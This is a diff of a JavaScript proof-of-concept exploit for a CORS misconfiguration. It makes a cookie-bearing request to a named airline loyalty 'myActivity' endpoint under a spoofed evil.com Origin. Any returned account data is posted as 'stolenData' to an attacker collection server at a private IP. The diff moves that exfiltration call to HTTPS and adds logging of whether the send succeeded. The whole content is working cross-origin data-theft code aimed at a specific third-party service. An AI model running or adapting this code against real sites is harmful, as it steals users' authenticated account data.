@@ -14,7 +14,7 @@
         function testCORS() {
             fetch("https://book-pia.crane.aero/ibe/loyalty/myActivity?_cid=dbf65053-b489-4e5f-9d9b-3798f6df122e", {
                 method: "GET",
-                credentials: "include", // Include cookies for testing
+                credentials: "include", // Include cookies for authentication
                 headers: {
                     "Origin": "https://evil.com" // Fake origin
                 }
@@ -24,14 +24,16 @@
                 document.getElementById("result").innerText = "✅ CORS is misconfigured! Data leaked.";
                 console.log("Leaked Data:", data);
 
-                // Send leaked data to attacker's server
-                fetch("http://192.168.63.128:8080/collect", {
+                // Send leaked data to attacker's server (Must use HTTPS)
+                fetch("https://192.168.63.128:8080/collect", { 
                     method: "POST",
                     headers: {
                         "Content-Type": "application/json"
                     },
                     body: JSON.stringify({ stolenData: data })
-                });
+                })
+                .then(response => console.log("Data sent successfully:", response))
+                .catch(error => console.error("Error sending data:", error));
             })
             .catch(error => {
                 console.error("Error:", error);
